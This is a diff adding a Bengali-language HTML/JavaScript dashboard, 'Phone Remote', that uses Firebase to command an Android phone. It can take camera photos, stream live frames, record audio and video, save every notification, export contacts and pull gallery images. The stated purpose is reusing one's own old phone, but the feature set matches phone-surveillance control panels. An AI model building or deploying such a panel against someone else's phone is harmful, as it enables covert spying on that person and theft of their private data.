@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Phone Remote — ড্যাশবোর্ড</title>
+<style>
+  :root{--bg:#0d1117;--card:#161b22;--line:#30363d;--txt:#e6edf3;--dim:#8b949e;--acc:#4f7cff;--ok:#3fb950;--bad:#f85149}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--txt);font-family:system-ui,-apple-system,'Segoe UI','Noto Sans Bengali',sans-serif;font-size:15px}
+  .wrap{max-width:880px;margin:0 auto;padding:14px}
+  header{display:flex;align-items:center;justify-content:space-between;padding:14px 0;border-bottom:1px solid var(--line);margin-bottom:14px}
+  header h1{font-size:20px;margin:0}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px;margin-bottom:14px}
+  .card h2{font-size:16px;margin:0 0 12px;color:#cdd9e5}
+  .dim{color:var(--dim);font-size:13px}
+  button{background:var(--acc);border:0;color:#fff;border-radius:8px;padding:10px 14px;font-size:14px;cursor:pointer;font-family:inherit}
+  button:hover{filter:brightness(1.12)}
+  button.ghost{background:transparent;border:1px solid var(--line);color:var(--txt)}
+  input,select,textarea{background:#0d1117;border:1px solid var(--line);border-radius:8px;color:var(--txt);padding:10px;font-size:14px;width:100%;font-family:inherit}
+  textarea{min-height:110px;font-family:monospace;font-size:12px}
+  .row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+  .row input,.row select{width:auto}
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:8px}
+  .ph{position:relative;aspect-ratio:1;border-radius:8px;overflow:hidden;border:1px solid var(--line);cursor:pointer;background:#0d1117;display:flex;align-items:center;justify-content:center}
+  .ph img{width:100%;height:100%;object-fit:cover;display:block}
+  .tag{position:absolute;left:4px;top:4px;background:rgba(0,0,0,.6);font-size:10px;padding:2px 5px;border-radius:4px}
+  .thumb-time{position:absolute;right:4px;bottom:4px;background:rgba(0,0,0,.6);font-size:10px;padding:2px 5px;border-radius:4px}
+  .badge{padding:3px 10px;border-radius:99px;font-size:12px;border:1px solid var(--line)}
+  .badge.on{color:var(--ok);border-color:var(--ok)}
+  .badge.off{color:var(--bad);border-color:var(--bad)}
+  .badge.live{color:#ff7b72;border-color:#ff7b72;animation:blink 1.2s infinite}
+  .badge.rec{color:#f85149;border-color:#f85149;animation:blink 1.2s infinite}
+  @keyframes blink{50%{opacity:.4}}
+  ul{list-style:none;margin:0;padding:0;max-height:320px;overflow-y:auto}
+  li{padding:9px 10px;border:1px solid var(--line);border-radius:8px;margin-bottom:6px}
+  li .t{font-weight:600}
+  li .m{color:var(--dim);font-size:12px;margin-top:2px;display:flex;gap:8px;flex-wrap:wrap}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  td,th{border-bottom:1px solid var(--line);padding:7px 6px;text-align:left}
+  #liveImg{width:100%;border-radius:10px;border:1px solid var(--line);margin-top:10px;min-height:60px}
+  .rec{border:1px solid var(--line);border-radius:10px;padding:10px;margin-bottom:10px}
+  .rec-head{font-size:13px;color:#cdd9e5;margin-bottom:8px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px}
+  .rec video,.rec audio{width:100%;border-radius:6px}
+  #modal{position:fixed;inset:0;background:rgba(0,0,0,.87);display:flex;align-items:center;justify-content:center;z-index:50;cursor:zoom-out}
+  #modal img{max-width:96vw;max-height:96vh;border-radius:8px}
+  .hidden{display:none!important}
+  #toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);background:#22272e;border:1px solid var(--line);padding:10px 16px;border-radius:10px;z-index:60;display:none;max-width:90vw}
+  .banner{background:#3d2b00;color:#ffdf8e;border:1px solid #6b4f00;padding:10px 14px;border-radius:10px;margin-bottom:12px;font-size:13px}
+  .empty{color:var(--dim);text-align:center;padding:20px 0}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div id="noNet" class="banner hidden">
+    ⚠️ Firebase লাইব্রেরি লোড হয়নি — ইন্টারনেট সংযোগ দরকার। (চ্যাটের ভেতরের প্রিভিউতে এটি কাজ করবে না — ফাইলটি ডাউনলোড করে Chrome/Firefox-এ খুলুন।)
+  </div>
+
+  <header>
+    <h1>🛰️ Phone Remote ড্যাশবোর্ড</h1>
+    <div class="row">
+      <button id="btnResetCfg" class="ghost hidden" title="Firebase কনফিগ বদলান">⚙️</button>
+      <button id="btnLogout" class="ghost hidden">লগআউট</button>
+    </div>
+  </header>
+
+  <!-- ধাপ ১: কনফিগ -->
+  <section id="setupCard" class="card hidden">
+    <h2>১) Firebase কনফিগ</h2>
+    <p class="dim">
+      Firebase Console → ⚙️ <b>Project Settings</b> → <b>General</b> → আপনার Web অ্যাপ (<b>&lt;/&gt;</b> আইকন) →
+      SDK setup থেকে <b>পুরো firebaseConfig</b> কপি করে নিচে পেস্ট করুন।
+      (apiKey, databaseURL, storageBucket, projectId, appId — সবগুলোই থাকতে হবে)
+    </p>
+    <textarea id="cfgRaw" placeholder='const firebaseConfig = {
+  apiKey: "AIza...",
+  databaseURL: "https://myproject-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "myproject",
+  storageBucket: "myproject.firebasestorage.app",
+  messagingSenderId: "123456",
+  appId: "1:123...:web:abc..."
+};'></textarea>
+    <div style="height:10px"></div>
+    <button id="btnCfgSave">✅ কনফিগ সেভ করুন</button>
+  </section>
+
+  <!-- ধাপ ২: লগইন -->
+  <section id="authCard" class="card hidden">
+    <h2>২) লগইন</h2>
+    <p class="dim">Firebase Security Rules-এ যে ইমেইলটি দিয়েছেন সেটাই ব্যবহার করুন। প্রথমবার "নতুন অ্যাকাউন্ট তৈরি করুন" চাপুন।</p>
+    <input id="email" type="email" placeholder="ইমেইল" style="margin-bottom:8px">
+    <input id="pass" type="password" placeholder="পাসওয়ার্ড (৬+ অক্ষর)" style="margin-bottom:10px">
+    <div class="row">
+      <button id="btnLogin">লগইন</button>
+      <button id="btnSignup" class="ghost">নতুন অ্যাকাউন্ট তৈরি করুন</button>
+    </div>
+  </section>
+
+  <!-- মূল অ্যাপ -->
+  <main id="app" class="hidden">
+
+    <section class="card">
+      <div class="row" style="justify-content:space-between">
+        <div class="row">
+          <b>📱 ডিভাইস:</b>
+          <select id="deviceSel"></select>
+        </div>
+        <div class="row">
+          <span id="liveBadge" class="badge live hidden">🔴 LIVE</span>
+          <span id="recBadge" class="badge rec hidden">● রেকর্ডিং</span>
+          <span id="devBadge" class="badge off">…</span>
+        </div>
+      </div>
+      <div id="devStatus" class="dim" style="margin-top:10px"></div>
+    </section>
+
+    <section class="card">
+      <h2>📷 ছবি তুলুন (যখন খুশি)</h2>
+      <div class="row">
+        <button class="camBtn" data-cam="back">📸 পেছনের ক্যামেরা</button>
+        <button class="camBtn" data-cam="front">🤳 সামনের ক্যামেরা</button>
+        <button id="btnInfo" class="ghost">ℹ️ ডিভাইস তথ্য</button>
+      </div>
+    </section>
+
+    <section class="card">
+      <h2>🔴 লাইভ ভিউ (স্ক্রিন-শেয়ারের মতো)</h2>
+      <div class="row">
+        <select id="liveCam">
+          <option value="back">পেছনের ক্যামেরা</option>
+          <option value="front">সামনের ক্যামেরা</option>
+        </select>
+        <select id="liveInterval">
+          <option value="2">প্রতি ২ সেকেন্ড</option>
+          <option value="3" selected>প্রতি ৩ সেকেন্ড</option>
+          <option value="5">প্রতি ৫ সেকেন্ড</option>
+          <option value="10">প্রতি ১০ সেকেন্ড</option>
+        </select>
+        <button id="btnLiveOn">▶ লাইভ শুরু</button>
+        <button id="btnLiveOff" class="ghost">⏹ থামান</button>
+      </div>
+      <img id="liveImg" class="hidden" alt="লাইভ ফ্রেম">
+      <div id="liveTime" class="dim" style="margin-top:6px"></div>
+      <p class="dim" style="margin:8px 0 0">প্রতি কয়েক সেকেন্ডে ফ্রেম বদলায় — স্টোরেজে শুধু ১টি ফ্রেম থাকে, জমে না। ৩০ মিনিট পর নিজে থেমে যায় (চাইলে আবার চালু করুন)।</p>
+    </section>
+
+    <section class="card">
+      <h2>🎙️ অডিও রেকর্ড</h2>
+      <div class="row">
+        <select id="audioDur">
+          <option value="15">১৫ সেকেন্ড</option>
+          <option value="30">৩০ সেকেন্ড</option>
+          <option value="60" selected>১ মিনিট</option>
+          <option value="120">২ মিনিট</option>
+          <option value="300">৫ মিনিট</option>
+          <option value="600">১০ মিনিট</option>
+        </select>
+        <button id="btnAudioRec">🎙️ রেকর্ড শুরু</button>
+        <button id="btnStopRec" class="ghost">⏹ চলমান রেকর্ডিং থামান</button>
+      </div>
+      <p class="dim" style="margin:8px 0 0">ফোনের মাইক্রোফোন যা শুনছে তা রেকর্ড হয়ে নিচের তালিকায় জমা হবে।</p>
+    </section>
+
+    <section class="card">
+      <h2>🎥 ভিডিও রেকর্ড</h2>
+      <div class="row">
+        <select id="videoCam">
+          <option value="back">পেছনের ক্যামেরা</option>
+          <option value="front">সামনের ক্যামেরা</option>
+        </select>
+        <select id="videoDur">
+          <option value="15">১৫ সেকেন্ড</option>
+          <option value="30">৩০ সেকেন্ড</option>
+          <option value="60" selected>১ মিনিট</option>
+          <option value="120">২ মিনিট</option>
+          <option value="300">৫ মিনিট</option>
+        </select>
+        <button id="btnVideoRec">🎥 রেকর্ড শুরু</button>
+      </div>
+      <p class="dim" style="margin:8px 0 0">৪৮০p ভিডিও (সাউন্ডসহ, অনুমতি থাকলে) — স্টোরেজ বাঁচাতে সর্বোচ্চ ৫ মিনিট।</p>
+    </section>
+
+    <section class="card">
+      <h2>📼 রেকর্ডিং তালিকা</h2>
+      <div id="recList"></div>
+      <p class="dim empty" id="recEmpty">এখনো কোনো রেকর্ডিং নেই — উপরের বাটন থেকে অডিও/ভিডিও রেকর্ড করুন। (৩ দিনের বেশি পুরনোটা ফোন নিজেই মুছে দেয়)</p>
+    </section>
+
+    <section class="card">
+      <h2>🖼️ তোলা ছবি</h2>
+      <div id="photoGrid" class="grid"></div>
+      <p class="dim empty" id="photoEmpty">"ছবি তুলুন" বাটনে চাপলে ছবি এখানে আসবে।</p>
+    </section>
+
+    <section class="card">
+      <h2>🔔 নোটিফিকেশন (লাইভ + সেভ)</h2>
+      <ul id="notifList"></ul>
+      <p class="dim empty" id="notifEmpty">এখনো কোনো নোটিফিকেশন আসেনি — ফোনে "নোটিফিকেশন অ্যাক্সেস" চালু আছে তো? সব নোটিফিকেশন সেভ থাকে, এখানে সর্বশেষগুলো দেখা যায়।</p>
+    </section>
+
+    <section class="card">
+      <h2>👥 কন্টাক্ট লিস্ট</h2>
+      <div class="row" style="margin-bottom:10px">
+        <button id="btnContacts">📥 কন্টাক্ট আনুন</button>
+        <input id="contactSearch" class="hidden" placeholder="নাম বা নম্বর খুঁজুন…" style="flex:1;min-width:160px">
+      </div>
+      <div id="contactsWrap" class="hidden">
+        <div class="dim" id="contactsCount" style="margin-bottom:8px"></div>
+        <div style="overflow-x:auto">
+          <table>
+            <thead><tr><th>নাম</th><th>ফোন</th><th>ইমেইল</th></tr></thead>
+            <tbody id="contactsBody"></tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <section class="card">
+      <h2>🗃️ ফোনের গ্যালারি</h2>
+      <div class="row" style="margin-bottom:10px">
+        <button id="btnGallery">📥 গ্যালারির তালিকা আনুন (সর্বশেষ ১০০)</button>
+      </div>
+      <div id="galleryGrid" class="grid"></div>
+      <p class="dim empty" id="galleryEmpty">তালিকা আনলে প্রতিটি ছবির নিচে "দেখুন" বাটন পাবেন — চাপলে ফোন থেকে ক্লাউডে এসে দেখা যাবে।</p>
+    </section>
+
+  </main>
+</div>
+
+<div id="modal" class="hidden"><img id="modalImg" alt=""></div>
+<div id="toast"></div>
+
+<script type="module">
+const $ = (id) => document.getElementById(id);
+
+let FB = null;                 // { app, auth, db, api }
+let user = null;
+let topUnsubs = [];
+let devUnsubs = [];
+let attachedDevice = null;
+let status = {};
+let deviceInfo = {};
+let contacts = [];
+let galleryTiles = {};
+let photoKeys = new Set();
+let recKeys = new Set();
+let notifKeys = new Set();
+let seenResults = new Set();
+let lastLiveAt = 0;
+let tick = null;
+
+const escapeHtml = (s) => String(s).replace(/[&<>"']/g,
+  (c) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+
+function toast(msg) {
+  const t = $('toast');
+  t.textContent = msg;
+  t.style.display = 'block';
+  clearTimeout(t._h);
+  t._h = setTimeout(() => { t.style.display = 'none'; }, 2800);
+}
+
+function parseCfg(raw) {
+  const g = (k) => {
+    const m = raw.match(new RegExp('"' + k + '"\\s*:\\s*"([^"]+)"'));
+    return m ? m[1] : '';
+  };
+  return {
+    apiKey: g('apiKey'),
+    projectId: g('projectId'),
+    appId: g('appId'),
+    databaseURL: g('databaseURL') || g('databaseUrl'),
+    storageBucket: g('storageBucket'),
+    messagingSenderId: g('messagingSenderId')
+  };
+}
+
+function loadCfg() {
+  try { return JSON.parse(localStorage.getItem('pr_cfg') || 'null'); } catch (e) { return null; }
+}
+function saveCfg(c) { localStorage.setItem('pr_cfg', JSON.stringify(c)); }
+
+function showState() {
+  const cfg = loadCfg();
+  $('setupCard').classList.toggle('hidden', !!cfg);
+  $('authCard').classList.toggle('hidden', !cfg || !!user);
+  $('app').classList.toggle('hidden', !cfg || !user);
+  $('btnLogout').classList.toggle('hidden', !user);
+  $('btnResetCfg').classList.toggle('hidden', !user);
+}
+
+// ---------------- বাটন সংযোগ ----------------
+
+function wire() {
+  $('btnCfgSave').onclick = () => {
+    const c = parseCfg($('cfgRaw').value);
+    if (!c.apiKey || !c.projectId || !c.databaseURL || !c.appId) {
+      toast('❌ apiKey / projectId / databaseURL / appId পাওয়া যায়নি — পুরো firebaseConfig পেস্ট করুন');
+      return;
+    }
+    saveCfg(c);
+    toast('✅ সেভ হয়েছে — পেজ রিলোড হচ্ছে…');
+    setTimeout(() => location.reload(), 700);
+  };
+
+  const doAuth = (creator) => {
+    if (!FB) { toast('Firebase এখনো প্রস্তুত হয়নি — একটু পরে চেষ্টা করুন'); return; }
+    const email = $('email').value.trim();
+    const pass = $('pass').value;
+    if (!email || pass.length < 6) { toast('ইমেইল ও ৬+ অক্ষরের পাসওয়ার্ড দিন'); return; }
+    const fn = creator ? FB.api.createUserWithEmailAndPassword : FB.api.signInWithEmailAndPassword;
+    fn(FB.auth, email, pass)
+      .then(() => { localStorage.setItem('pr_email', email); })
+      .catch((e) => {
+        const m = {
+          'auth/email-already-in-use': 'এই ইমেইলে অ্যাকাউন্ট আছে — লগইন বাটন চাপুন',
+          'auth/invalid-credential': 'ইমেইল বা পাসওয়ার্ড ভুল',
+          'auth/invalid-email': 'ইমেইলটি সঠিক নয়',
+          'auth/weak-password': 'পাসওয়ার্ড কমপক্ষে ৬ অক্ষরের হতে হবে',
+          'auth/operation-not-allowed': 'Firebase Console → Authentication → Email/Password চালু করুন',
+          'auth/network-request-failed': 'নেটওয়ার্ক সমস্যা — ইন্টারনেট চেক করুন'
+        }[e.code] || ('❌ ' + e.message);
+        toast(m);
+      });
+  };
+  $('btnLogin').onclick = () => doAuth(false);
+  $('btnSignup').onclick = () => doAuth(true);
+
+  $('btnLogout').onclick = () => { if (FB) FB.api.signOut(FB.auth); };
+  $('btnResetCfg').onclick = () => {
+    if (confirm('Firebase কনফিগ মুছে নতুন করে সেট করবেন?')) {
+      localStorage.removeItem('pr_cfg');
+      location.reload();
+    }
+  };
+
+  document.querySelectorAll('.camBtn').forEach((b) =>
+    b.onclick = () => sendCmd('take_photo', { camera: b.dataset.cam }));
+  $('btnInfo').onclick = () => sendCmd('device_info', {});
+
+  $('btnLiveOn').onclick = () => sendCmd('start_live', {
+    camera: $('liveCam').value,
+    intervalSec: parseInt($('liveInterval').value, 10)
+  });
+  $('btnLiveOff').onclick = () => sendCmd('stop_live', {});
+
+  $('btnAudioRec').onclick = () => sendCmd('record_audio', {
+    durationSec: parseInt($('audioDur').value, 10)
+  });
+  $('btnVideoRec').onclick = () => sendCmd('record_video', {
+    camera: $('videoCam').value,
+    durationSec: parseInt($('videoDur').value, 10)
+  });
+  $('btnStopRec').onclick = () => sendCmd('stop_recording', {});
+
+  $('btnContacts').onclick = () => sendCmd('get_contacts', {});
+  $('btnGallery').onclick = () => sendCmd('get_gallery', { limit: 100 });
+  $('contactSearch').oninput = renderContacts;
+  $('modal').onclick = () => $('modal').classList.add('hidden');
+}
+
+// ---------------- কমান্ড পাঠানো ----------------
+
+function sendCmd(action, args) {
+  if (!FB || !user) { toast('আগে লগইন করুন'); return; }
+  if (!attachedDevice) { toast('কোনো ডিভাইস নেই — আগে পুরনো ফোনে অ্যাপের সার্ভিস চালু করুন'); return; }
+  FB.api.push(FB.api.ref(FB.db, 'devices/' + attachedDevice + '/commands'), {
+    action: action,
+    args: args,
+    at: FB.api.serverTimestamp()
+  });
+  toast('📤 কমান্ড পাঠানো হয়েছে…');
+}
+
+// ---------------- ডিভাইস লিসেনার ----------------
+
+function detachAll() {
+  topUnsubs.forEach((u) => { try { u(); } catch (e) {} });
+  devUnsubs.forEach((u) => { try { u(); } catch (e) {} });
+  topUnsubs = []; devUnsubs = [];
+  attachedDevice = null;
+  clearDeviceUI();
+}
+
+function clearDeviceUI() {
+  photoKeys.clear(); recKeys.clear(); notifKeys.clear();
+  status = {}; deviceInfo = {}; contacts = []; galleryTiles = {};
+  lastLiveAt = 0;
+  $('photoGrid').innerHTML = '';
+  $('recList').innerHTML = '';
+  $('recEmpty').style.display = '';
+  $('photoEmpty').style.display = '';
+  $('notifList').innerHTML = '';
+  $('notifEmpty').style.display = '';
+  $('galleryGrid').innerHTML = '';
+  $('galleryEmpty').style.display = '';
+  $('liveImg').classList.add('hidden');
+  $('liveImg').removeAttribute('src');
+  $('liveTime').textContent = '';
+  $('contactsWrap').classList.add('hidden');
+  $('contactSearch').classList.add('hidden');
+}
+
+function attachDevices() {
+  if (!FB || topUnsubs.length) return;
+  const { ref, onValue } = FB.api;
+  topUnsubs.push(onValue(ref(FB.db, 'device_list'), (s) => {
+    const names = [];
+    s.forEach((ch) => names.push(ch.key));
+    const sel = $('deviceSel');
+    sel.innerHTML = '';
+    if (!names.length) {
+      sel.innerHTML = '<option>— কোনো ডিভাইস নেই —</option>';
+      $('devStatus').textContent = 'পুরনো ফোনে অ্যাপে সার্ভিস চালু করলে এখানে দেখা যাবে। একাধিক ফোন দিলে সবগুলোই এখানে তালিকায় আসবে।';
+      $('devBadge').className = 'badge off';
+      $('devBadge').textContent = '…';
+      return;
+    }
+    names.forEach((n) => {
+      const o = document.createElement('option');
+      o.value = n; o.textContent = n;
+      sel.appendChild(o);
+    });
+    const saved = localStorage.getItem('pr_device');
+    if (!attachedDevice || !names.includes(attachedDevice)) {
+      attachedDevice = (saved && names.includes(saved)) ? saved : names[0];
+      attachDeviceListeners();
+    }
+    sel.value = attachedDevice;
+    sel.onchange = () => {
+      attachedDevice = sel.value;
+      localStorage.setItem('pr_device', attachedDevice);
+      attachDeviceListeners();
+    };
+  }));
+  if (!tick) tick = setInterval(updateStatusUI, 15000);
+}
+
+function attachDeviceListeners() {
+  devUnsubs.forEach((u) => { try { u(); } catch (e) {} });
+  devUnsubs = [];
+  clearDeviceUI();
+  if (!attachedDevice) return;
+
+  const { ref, onValue, onChildAdded, query, limitToLast } = FB.api;
+  const base = 'devices/' + attachedDevice;
+
+  devUnsubs.push(onValue(ref(FB.db, base + '/status'), (s) => {
+    status = s.val() || {};
+    updateStatusUI();
+  }));
+  devUnsubs.push(onValue(ref(FB.db, base + '/info'), (s) => {
+    deviceInfo = s.val() || {};
+    updateStatusUI();
+  }));
+  devUnsubs.push(onChildAdded(query(ref(FB.db, base + '/photos'), limitToLast(60)), (s) => {
+    addPhoto(s.val(), s.key);
+  }));
+  devUnsubs.push(onChildAdded(query(ref(FB.db, base + '/recordings'), limitToLast(30)), (s) => {
+    addRecording(s.val(), s.key);
+  }));
+  devUnsubs.push(onChildAdded(query(ref(FB.db, base + '/notifications'), limitToLast(100)), (s) => {
+    addNotif(s.val(), s.key);
+  }));
+  devUnsubs.push(onValue(ref(FB.db, base + '/live/latest'), (s) => {
+    const v = s.val();
+    if (v && v.url) {
+      lastLiveAt = v.at || Date.now();
+      // ব্রাউজার-ক্যাশ বাইপাস করতে টাইমস্ট্যাম্প যোগ করি
+      $('liveImg').src = v.url + (v.url.includes('?') ? '&' : '?') + 't=' + lastLiveAt;
+      $('liveImg').classList.remove('hidden');
+    }
+  }));
+  const autoStopRef = ref(FB.db, base + '/live/autoStopped');
+  devUnsubs.push(onValue(autoStopRef, (s) => {
+    if (s.val() === true) {
+      toast('⏹ ৩০ মিনিট শেষ — লাইভ ভিউ বন্ধ হয়েছে (আবার চালু করতে পারেন)');
+      try { FB.api.remove(autoStopRef); } catch (e) {}
+    }
+  }));
+  devUnsubs.push(onChildAdded(query(ref(FB.db, base + '/results'), limitToLast(25)), (s) => {
+    handleResult(s.val(), s.key);
+  }));
+}
+
+// ---------------- UI আপডেট ----------------
+
+function updateStatusUI() {
+  if (!attachedDevice) return;
+  const lastSeen = status.lastSeen || 0;
+  const online = (Date.now() - lastSeen) < 120000;
+  const b = $('devBadge');
+  b.className = 'badge ' + (online ? 'on' : 'off');
+  b.textContent = online ? 'অনলাইন' : 'অফলাইন';
+  $('liveBadge').classList.toggle('hidden', status.live !== true);
+  $('recBadge').classList.toggle('hidden', status.recording !== true);
+
+  const bat = (status.battery == null) ? '?' : status.battery;
+  const free = (status.freeMb == null) ? '?' : status.freeMb;
+  $('devStatus').textContent =
+    (deviceInfo.model || '') +
+    ' · Android ' + (deviceInfo.android || '?') +
+    ' · 🔋 ' + bat + '%' + (status.charging ? ' ⚡চার্জিং' : '') +
+    ' · ফ্রি স্টোরেজ ' + free + ' MB' +
+    ' · সর্বশেষ হার্টবিট: ' + (lastSeen ? new Date(lastSeen).toLocaleTimeString() : '—');
+
+  if (lastLiveAt) {
+    const ago = Math.max(0, Math.round((Date.now() - lastLiveAt) / 1000));
+    $('liveTime').textContent = 'সর্বশেষ ফ্রেম: ' + ago + ' সেকেন্ড আগে';
+  }
+}
+
+function addPhoto(v, key) {
+  if (!v || !v.url || photoKeys.has(key)) return;
+  photoKeys.add(key);
+  $('photoEmpty').style.display = 'none';
+  const d = document.createElement('div');
+  d.className = 'ph';
+  const img = document.createElement('img');
+  img.src = v.url; img.loading = 'lazy'; img.alt = '';
+  d.appendChild(img);
+  const tag = document.createElement('span');
+  tag.className = 'tag';
+  tag.textContent = (v.cam === 'front' ? 'ফ্রন্ট' : 'ব্যাক');
+  d.appendChild(tag);
+  const tm = document.createElement('span');
+  tm.className = 'thumb-time';
+  tm.textContent = v.at ? new Date(v.at).toLocaleTimeString() : '';
+  d.appendChild(tm);
+  d.onclick = () => { $('modalImg').src = v.url; $('modal').classList.remove('hidden'); };
+  $('photoGrid').prepend(d);
+  while ($('photoGrid').children.length > 60) $('photoGrid').removeChild($('photoGrid').lastChild);
+}
+
+function addRecording(v, key) {
+  if (!v || !v.url || recKeys.has(key)) return;
+  recKeys.add(key);
+  $('recEmpty').style.display = 'none';
+  const d = document.createElement('div');
+  d.className = 'rec';
+  const head = document.createElement('div');
+  head.className = 'rec-head';
+  const durTxt = v.durSec ? (v.durSec < 60 ? v.durSec + ' সেকেন্ড' : (v.durSec / 60) + ' মিনিট') : '';
+  head.textContent = (v.type === 'audio' ? '🎙️ অডিও' : '🎥 ভিডিও' + (v.cam === 'front' ? ' (ফ্রন্ট)' : ' (ব্যাক)')) +
+    ' · ' + durTxt + ' · ' + (v.at ? new Date(v.at).toLocaleString() : '');
+  d.appendChild(head);
+  const el = document.createElement(v.type === 'audio' ? 'audio' : 'video');
+  el.controls = true;
+  el.preload = 'metadata';
+  el.src = v.url;
+  d.appendChild(el);
+  $('recList').prepend(d);
+  while ($('recList').children.length > 30) $('recList').removeChild($('recList').lastChild);
+}
+
+function addNotif(v, key) {
+  if (!v || notifKeys.has(key)) return;
+  notifKeys.add(key);
+  $('notifEmpty').style.display = 'none';
+  const li = document.createElement('li');
+  const t = document.createElement('div'); t.className = 't';
+  t.textContent = v.title || '';
+  const x = document.createElement('div'); x.className = 'dim';
+  x.textContent = v.text || '';
+  const m = document.createElement('div'); m.className = 'm';
+  const app = document.createElement('span');
+  app.textContent = '📱 ' + (v.app || v.pkg || '');
+  const at = document.createElement('span');
+  at.textContent = v.at ? new Date(v.at).toLocaleString() : '';
+  m.appendChild(app); m.appendChild(at);
+  li.appendChild(t); li.appendChild(x); li.appendChild(m);
+  $('notifList').prepend(li);
+  while ($('notifList').children.length > 100) $('notifList').removeChild($('notifList').lastChild);
+}
+
+function handleResult(v, key) {
+  if (!v) return;
+  const fresh = !seenResults.has(key);
+  seenResults.add(key);
+  if (v.ok === false) {
+    if (fresh) toast('❌ সমস্যা: ' + (v.error || 'অজানা'));
+    return;
+  }
+  switch (v.action) {
+    case 'take_photo':
+      if (fresh) toast('✅ ছবি এসে গেছে (নিচের গ্রিডে দেখুন)');
+      break;
+    case 'start_live':
+      if (fresh) toast('🔴 লাইভ ভিউ চালু হয়েছে');
+      break;
+    case 'stop_live':
+      if (fresh) toast('⏹ লাইভ ভিউ বন্ধ হয়েছে');
+      break;
+    case 'record_audio':
+      if (fresh) toast('✅ অডিও রেকর্ড হয়ে সেভ হয়েছে — রেকর্ডিং তালিকায় দেখুন');
+      break;
+    case 'record_video':
+      if (fresh) toast('✅ ভিডিও রেকর্ড হয়ে সেভ হয়েছে — রেকর্ডিং তালিকায় দেখুন');
+      break;
+    case 'get_image':
+      if (v.mediaId != null && galleryTiles[v.mediaId]) {
+        const tile = galleryTiles[v.mediaId];
+        tile.innerHTML = '';
+        const img = document.createElement('img');
+        img.src = v.url; img.loading = 'lazy'; img.alt = '';
+        tile.appendChild(img);
+        tile.onclick = () => { $('modalImg').src = v.url; $('modal').classList.remove('hidden'); };
+        if (fresh) toast('✅ ছবি এসে গেছে');
+      }
+      break;
+    case 'get_contacts':
+      try { contacts = JSON.parse(v.data || '[]'); } catch (e) { contacts = []; }
+      $('contactsWrap').classList.remove('hidden');
+      $('contactSearch').classList.remove('hidden');
+      $('contactsCount').textContent = 'মোট ' + contacts.length + ' টি কন্টাক্ট';
+      renderContacts();
+      break;
+    case 'get_gallery':
+      let items = [];
+      try { items = JSON.parse(v.data || '[]'); } catch (e) {}
+      renderGallery(items);
+      break;
+    case 'device_info': {
+      let d = {};
+      try { d = JSON.parse(v.data || '{}'); } catch (e) {}
+      if (fresh) toast('✅ সংযুক্ত: ' + (d.model || '') + ' · Android ' + (d.android || '?') +
+        ' · ব্যাটারি ' + (d.battery != null ? d.battery : '?') + '%');
+      break;
+    }
+  }
+}
+
+function renderContacts() {
+  const q = $('contactSearch').value.trim().toLowerCase();
+  const rows = contacts.filter((c) => {
+    if (!q) return true;
+    const s = (c.name || '') + ' ' + (c.phones || []).join(' ') + ' ' + (c.emails || []).join(' ');
+    return s.toLowerCase().includes(q);
+  });
+  $('contactsBody').innerHTML = rows.map((c) =>
+    '<tr><td>' + escapeHtml(c.name || '') + '</td><td>' +
+    (c.phones || []).map(escapeHtml).join('<br>') + '</td><td>' +
+    (c.emails || []).map(escapeHtml).join('<br>') + '</td></tr>'
+  ).join('');
+}
+
+function renderGallery(items) {
+  const g = $('galleryGrid');
+  g.innerHTML = '';
+  galleryTiles = {};
+  $('galleryEmpty').style.display = items.length ? 'none' : '';
+  items.forEach((it) => {
+    const d = document.createElement('div');
+    d.className = 'ph';
+    const label = document.createElement('div');
+    label.className = 'dim';
+    label.style.textAlign = 'center';
+    label.style.fontSize = '11px';
+    label.style.padding = '6px';
+    label.textContent = '🗓️ ' + new Date(it.at).toLocaleDateString() + '\n' + Math.max(1, Math.round(it.size / 1024)) + ' KB';
+    d.appendChild(label);
+    const btn = document.createElement('button');
+    btn.textContent = 'দেখুন';
+    btn.style.position = 'absolute';
+    btn.style.bottom = '6px';
+    btn.style.padding = '4px 10px';
+    btn.style.fontSize = '12px';
+    btn.onclick = (e) => {
+      e.stopPropagation();
+      sendCmd('get_image', { mediaId: it.id });
+      toast('ছবি আসছে…');
+    };
+    d.appendChild(btn);
+    galleryTiles[it.id] = d;
+    g.appendChild(d);
+  });
+}
+
+// ---------------- শুরু ----------------
+
+wire();
+showState();
+
+(async () => {
+  let A, AU, DB;
+  try {
+    A = await import('https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js');
+    AU = await import('https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js');
+    DB = await import('https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js');
+  } catch (e) {
+    $('noNet').classList.remove('hidden');
+    return;
+  }
+
+  const cfg = loadCfg();
+  if (!cfg) return;
+
+  try {
+    const app = A.initializeApp({
+      apiKey: cfg.apiKey,
+      databaseURL: cfg.databaseURL,
+      projectId: cfg.projectId,
+      storageBucket: cfg.storageBucket,
+      messagingSenderId: cfg.messagingSenderId,
+      appId: cfg.appId
+    });
+    FB = {
+      app: app,
+      auth: AU.getAuth(app),
+      db: DB.getDatabase(app),
+      api: Object.assign({}, A, AU, DB)
+    };
+    $('email').value = localStorage.getItem('pr_email') || '';
+    FB.api.onAuthStateChanged(FB.auth, (u) => {
+      user = u;
+      if (u) attachDevices();
+      else detachAll();
+      showState();
+    });
+  } catch (e) {
+    toast('কনফিগ দিয়ে Firebase চালু করা যায়নি: ' + e.message);
+    showState();
+  }
+})();
+</script>
+</body>
+</html>
